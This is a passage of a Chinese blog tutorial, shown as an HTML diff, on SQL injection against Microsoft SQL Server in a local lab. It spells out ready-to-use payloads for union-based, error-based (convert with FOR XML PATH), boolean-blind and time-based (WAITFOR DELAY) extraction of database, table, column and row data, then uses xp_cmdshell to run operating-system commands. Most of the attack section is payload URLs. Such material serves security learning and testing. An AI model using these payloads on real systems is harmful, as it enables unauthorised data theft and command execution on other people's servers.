-<p>这样环境就配置好了，访问<code>http://192.168.41.131:8080/SqlServer.php?id=101</code><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279598408-007810b0-f16a-426a-a2e3-8b8b832a4047.png"></p>
+<p>这样环境就配置好了，访问<code>http://192.168.41.131:8080/SqlServer.php?id=101</code><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279598408-007810b0-f16a-426a-a2e3-8b8b832a4047.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279598408-007810b0-f16a-426a-a2e3-8b8b832a4047.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h3 id="lZpDf">常见注入函数和关键字</h3>
-以下是在SQL注入中常用的函数与关键字
 
+<p>以下是在SQL注入中常用的函数与关键字</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//TOP 对标与MSSQL中的limit，想要输出一条信息 TOP 1 ，输出两条 TOP 2</span><br><span class="line">SELECT TOP 2 StudentName FROM STUDENTS</span><br><span class="line">//@@version 获取版本信息</span><br><span class="line">SELECT @@version</span><br><span class="line">//db_name 获取数据的名字</span><br><span class="line">SELECT db_name()</span><br><span class="line">//OBEJCT_ID 获取表对象ID</span><br><span class="line">OBJECT_ID(&#x27;表名&#x27;)</span><br><span class="line">//col_name table_id表对象ID column_id 列的序号 </span><br><span class="line">COL_NAME ( table_id , column_id )</span><br><span class="line">//convert 把日期转换成新数据类型的通用函数</span><br><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br><span class="line">//stuff 删除字符串中的一部分内容，用另一个字符串替代</span><br><span class="line">stuff( character_expression , start , length , replaceWith_expression )</span><br><span class="line">//len 返回目标字符串的长度</span><br><span class="line">len(select db_name())</span><br><span class="line">//SUBSTRING 用于从字符串中提取指定位置的一部分</span><br><span class="line">SUBSTRING(expression, start, length)</span><br></pre></td></tr></table></figure>
 
 <h3 id="HZao5">注入手法</h3>
-注入手法总的来说和Mysql差不多，差别在于一些函数的区别
 
+<p>注入手法总的来说和Mysql差不多，差别在于一些函数的区别</p>
 <h4 id="JU1ft">联合查询</h4>
-在MSSQL数据库中会存在一个系统自带库-->master，每个库都存在一个系统自带表-->sysobjects。该系统表中对于我们来说有三个字段有用：
 
+<p>在MSSQL数据库中会存在一个系统自带库–&gt;master，每个库都存在一个系统自带表–&gt;sysobjects。该系统表中对于我们来说有三个字段有用：</p>
 <ul>
 <li>NAME：表名信息</li>
 <li>XTYPE： 代表 表的类型，S代表系统自带表，U代表用户创建表</li>
@@ -450,43 +683,43 @@ MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库的
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and exists(select * from sysobjects) --+</span><br></pre></td></tr></table></figure>
 
 <p>返回正常说明网站使用的数据库是MSSQL</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280514056-1d5ed736-6607-41e8-b4c8-be5316676472.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280514056-1d5ed736-6607-41e8-b4c8-be5316676472.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280514056-1d5ed736-6607-41e8-b4c8-be5316676472.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>联合注入中必要的一步就是判断字段长度，当<code>order by 4</code>回显正常，但<code>order by 5</code>报错时，表明字段长度是3</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 order by 4 --+  正常</span><br><span class="line">SqlServer.php?id=101 order by 5 --+  报错</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280632611-aafdf99b-293c-4352-97d7-583c58c60f86.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280632611-aafdf99b-293c-4352-97d7-583c58c60f86.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280632611-aafdf99b-293c-4352-97d7-583c58c60f86.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>接下来就是寻找字符串的回显位置（前面select语句查询为空时，才会回显联合查询的东西）</p>
 <p>可以看到，四个回显位均可以利用（正常渗透中，回显位不固定）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,4 --+ </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280830221-499a2f79-e52b-47bd-8bbe-0af4df071a1b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280830221-499a2f79-e52b-47bd-8bbe-0af4df071a1b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280830221-499a2f79-e52b-47bd-8bbe-0af4df071a1b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>查询当前数据库的版本信息和名字</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,db_name(),3,@@version --+ </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281119355-7d4fd5ba-02ed-464c-a318-52ceeebc0ab0.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281119355-7d4fd5ba-02ed-464c-a318-52ceeebc0ab0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281119355-7d4fd5ba-02ed-464c-a318-52ceeebc0ab0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <blockquote>
 <p>此处需要注意，当联合注入的数据和前半部分的数据类型不匹配时，会出现报错</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281211809-ec2880ea-f667-478d-8c18-5232593c7e66.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281211809-ec2880ea-f667-478d-8c18-5232593c7e66.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281211809-ec2880ea-f667-478d-8c18-5232593c7e66.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 </blockquote>
 <p>查询表名，将获取到的数据库名和<code>.dbo.sysobjects</code>进行拼接，通过限制<code>xtype</code>为u，使用<code>TOP 1</code>进行限制，找出第一条查询到的用户创建表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype=&#x27;u&#x27;) --+ </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282258075-d68d6a5b-27a6-49e3-b992-9c026270f216.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282258075-d68d6a5b-27a6-49e3-b992-9c026270f216.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282258075-d68d6a5b-27a6-49e3-b992-9c026270f216.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>查询第二条表名数据时，可以使用<code>and name != &#39;第一次输出中的表名&#39;</code>的方式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype=&#x27;u&#x27; and name != &#x27;STUDENTS&#x27;) --+ </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282277131-f0d9112d-7702-4c8c-80c0-3e567dd07eaf.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282277131-f0d9112d-7702-4c8c-80c0-3e567dd07eaf.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282277131-f0d9112d-7702-4c8c-80c0-3e567dd07eaf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>获取列名，通过col_name、object_id等函数，遍历获取列名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),1) from sysobjects)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),2) from sysobjects)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),3) from sysobjects)--+</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350362233-3bb50919-4dee-443d-a521-2cd26e378cfe.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350362233-3bb50919-4dee-443d-a521-2cd26e378cfe.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350362233-3bb50919-4dee-443d-a521-2cd26e378cfe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>获取数据，这里获取StudentID字段的数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101 and StudentID != 102)--+</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350783382-420b25f3-128f-4556-a68c-5f13562a33cb.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350783382-420b25f3-128f-4556-a68c-5f13562a33cb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350783382-420b25f3-128f-4556-a68c-5f13562a33cb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h4 id="pnSUl">报错注入</h4>
-上面我们说过，MSSQL数据库是强类型语言数据库，当类型不一样时，会报错，配合子查询即可实现报错注入。可以利用的函数有以下这些：
 
+<p>上面我们说过，MSSQL数据库是强类型语言数据库，当类型不一样时，会报错，配合子查询即可实现报错注入。可以利用的函数有以下这些：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">convert() </span><br><span class="line">file_name() </span><br><span class="line">db_name() </span><br><span class="line">col_name() </span><br><span class="line">filegroup_name()</span><br><span class="line">object_name() </span><br><span class="line">schema_name() </span><br><span class="line">type_name() </span><br><span class="line">cast()</span><br></pre></td></tr></table></figure>
 
 <p>这里我们使用convert函数作为演示，convert函数语法如下</p>
@@ -495,34 +728,34 @@ MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库的
 <p>对于<code>convert(int,@@version)</code>，convert函数会首先执行第二给参数指定的SQL查询，然后尝试将查询结果转为int类型。但是由于查询语句查询出来的结果时varchar类型，无法转为指定的int类型，因此convert函数会爆出一个SQLSever的错误消息，格式是<code>&quot;SQL查询结果&quot;无法转换为&quot;int&quot;类型</code>，这样攻击者就可以利用报错来获取到SQL的查询结果</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="keyword">convert</span>(<span class="type">int</span>,db_name())</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351877891-2432a32c-cfb1-4f2b-baf8-278e35bb21f1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351877891-2432a32c-cfb1-4f2b-baf8-278e35bb21f1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351877891-2432a32c-cfb1-4f2b-baf8-278e35bb21f1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>除了使用函数以外，在两个不同类型的数据进行比较时，也会爆出SqlServer的错误信息，也是一种利用方法</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name())</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351925683-be991476-3931-45a6-9e61-80ca7cab0cea.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351925683-be991476-3931-45a6-9e61-80ca7cab0cea.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351925683-be991476-3931-45a6-9e61-80ca7cab0cea.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>首先查询数据库名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查询当前数据库</span><br><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name(<span class="number">0</span>))</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查询第二个数据库</span><br><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
 
 <p>这里我们可以通过<code>for xml path</code>，查询所有数据库的名字，<code>FOR XML PATH(&#39;&#39;)</code> 表示输出 XML，但不加任何标签。通常可以配合<code>stuff()</code>使用，用来拼接多个值并去除第一个多余分隔符</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sys.databases for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749353320049-8a35d83b-9f4d-4d6b-8453-a046de1b53e5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749353320049-8a35d83b-9f4d-4d6b-8453-a046de1b53e5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749353320049-8a35d83b-9f4d-4d6b-8453-a046de1b53e5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>爆出所有表名，但是其中存在一些系统表，可以通过<code>xtype=&#39;U&#39;</code>来过滤出用户表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sysobjects WHERE xtype = &#x27;U&#x27; for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)) --+</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358034266-f1ca5108-e55a-4bbf-a10a-7e9b28f04240.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358034266-f1ca5108-e55a-4bbf-a10a-7e9b28f04240.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358034266-f1ca5108-e55a-4bbf-a10a-7e9b28f04240.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>接下来就是爆出<code>Students</code>表的所有字段</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and  1=convert(int,stuff((select quotename(name) from SchoolDB.sys.columns where object_id=object_id(&#x27;Students&#x27;) for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)) --</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358196631-3425d161-db38-4843-875e-78d885791f7b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358196631-3425d161-db38-4843-875e-78d885791f7b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358196631-3425d161-db38-4843-875e-78d885791f7b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>最后爆数据即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(StudentID) from Students for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358344892-388847df-803f-478d-9e43-f21c93308625.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358344892-388847df-803f-478d-9e43-f21c93308625.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358344892-388847df-803f-478d-9e43-f21c93308625.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>剩下的报错函数原理也是相似的，读者可以自行查阅资料</p>
 <h4 id="IeAWT">布尔盲注</h4>
-如果存在没有回显位 或者 不能直接通过页面返回内容查看数据库信息时，我们就可以通过布尔盲注去查询信息。页面会根据用户输入只回显true和flase，则可以通过构造逻辑判断来得到想要的信息
 
+<p>如果存在没有回显位 或者 不能直接通过页面返回内容查看数据库信息时，我们就可以通过布尔盲注去查询信息。页面会根据用户输入只回显true和flase，则可以通过构造逻辑判断来得到想要的信息</p>
 <p>首先需要我们去判断是存在盲注，使用以下注入语句测试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//正常回显</span><br><span class="line">SqlServer.php?id=101 and 1=1--+</span><br><span class="line">//不正常回显</span><br><span class="line">SqlServer.php?id=101 and 1=2--+</span><br></pre></td></tr></table></figure>
 
@@ -533,28 +766,28 @@ MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库的
 <p>猜解数据库名字，</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//获取数据库名的第一个字符ascii码为83</span><br><span class="line">SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=83 -- </span><br><span class="line">//获取数据库名的第一个字符ascii码为99</span><br><span class="line">SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=99 -- </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359514500-d4417e71-1035-4e8e-8349-26516dccc2e8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359514500-d4417e71-1035-4e8e-8349-26516dccc2e8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359514500-d4417e71-1035-4e8e-8349-26516dccc2e8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>后续的表名、列名和数据，只需要替换响应的SQL语句即可</p>
 <h4 id="KxKAK">延时注入</h4>
-这里主要是使用`WAITFOR DELAY '0:0:n'`这个语句表示要延迟几秒，他的作用就是等待待定时间，然后再执行后续语句。如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断网站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。
 
+<p>这里主要是使用<code>WAITFOR DELAY &#39;0:0:n&#39;</code>这个语句表示要延迟几秒，他的作用就是等待待定时间，然后再执行后续语句。如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断网站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。</p>
 <p>利用该注入语句，可以判断此处是否存在延时注入</p>
 <p>观察浏览器f12，观察时间确认成功延时，代表存在漏洞</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 WAITFOR DELAY &#x27;0:0:5&#x27; --</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359997217-3ebd3e53-c8bb-4bfe-ac61-f51a6f57347e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359997217-3ebd3e53-c8bb-4bfe-ac61-f51a6f57347e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359997217-3ebd3e53-c8bb-4bfe-ac61-f51a6f57347e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>后续利用和布尔注入相类似，判断数据库名长度</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 if (len((select db_name()))=8) WAITFOR DELAY &#x27;0:0:5&#x27; --+ </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360255270-e63390ae-72d1-46a3-ad5e-13a58a6b6e05.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360255270-e63390ae-72d1-46a3-ad5e-13a58a6b6e05.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360255270-e63390ae-72d1-46a3-ad5e-13a58a6b6e05.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>然后一个字符一个字符进行猜解数据库名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 if (ascii(substring((select db_name()),1,1))=83) WAITFOR DELAY &#x27;0:0:5&#x27;-- </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360227353-a350a9b9-fe3d-41f9-b34e-c424b1bb1b56.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360227353-a350a9b9-fe3d-41f9-b34e-c424b1bb1b56.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360227353-a350a9b9-fe3d-41f9-b34e-c424b1bb1b56.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>后续只需要替换SQL语句查询点，就可以注入其他数据</p>
 <h2 id="zxVml">SqlServer命令执行</h2>
-MSSQL数据库中，存在`xp_cmdshell`函数：SQL中运行系统命令行的系统存储过程，允许 SQL Server 以服务账户的身份执行 Windows 命令或外部程序。如果该命令开启时，我们就可以执行系统命令。
 
+<p>MSSQL数据库中，存在<code>xp_cmdshell</code>函数：SQL中运行系统命令行的系统存储过程，允许 SQL Server 以服务账户的身份执行 Windows 命令或外部程序。如果该命令开启时，我们就可以执行系统命令。</p>
 <p>我们现在在判断了网站权限是<code>sa</code>权限后，想要执行系统命令，就先要判断<code>xp_cmdshell</code>是否存在，当页面正常返回时，说明该命令是开启的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=(select count(*) from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name = &#x27;xp_cmdshell&#x27;)</span><br></pre></td></tr></table></figure>
 
@@ -566,128 +799,1494 @@ MSSQL数据库中，存在`xp_cmdshell`函数：SQL中运行系统命令行的�
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 ;exec master..xp_cmdshell &quot;命令&quot;</span><br></pre></td></tr></table></figure>
 
 <p>通过运行<code>whoami</code>，可以看到sqlserver的权限为<code>nt service\mssqlserver</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749362631456-529373c6-eb7f-4ed3-81ec-434d7ed409e5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749362631456-529373c6-eb7f-4ed3-81ec-434d7ed409e5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749362631456-529373c6-eb7f-4ed3-81ec-434d7ed409e5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/Web/" class="">
+              Web
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>CurlySean</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2025/07/09/基于SqlServer的SQL注入/" target="_blank" title="基于SqlServer的SQL注入">http://curlysean.github.io/2025/07/09/基于SqlServer的SQL注入/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
     </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-          <div class="reward-container">
-  <div>请我一杯咖啡吧！</div>
-  <button>
-    赞赏
-  </button>
-  <div class="post-reward">
-      <div>
